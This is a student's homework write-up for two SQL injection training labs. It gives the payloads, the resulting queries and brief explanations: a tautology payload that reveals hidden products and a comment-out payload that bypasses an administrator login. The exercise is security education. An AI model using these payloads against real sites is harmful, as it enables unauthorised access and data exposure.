
# SQL Injection Homework – Week 9

## Lab 1 – Retrieve Hidden Data

**Status:** Solved

**Payload:**
`Corporate gifts' OR 1=1--`

**SQL Query:**
```sql
SELECT * FROM products
WHERE category = 'Corporate gifts' OR 1=1--'
AND released = 1;
```

**Explanation:**

The condition 1=1 is always true. The -- comments out the released check, allowing hidden products to be displayed.
¨
## Lab 2 – Login Bypass

**Status:** Solved

**Payload:**
`administrator'--`

**SQL Query:**
```sql
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = 'test123';
```

**Explanation:**

The payload comments out the password check.
This allows login as administrator without the correct password.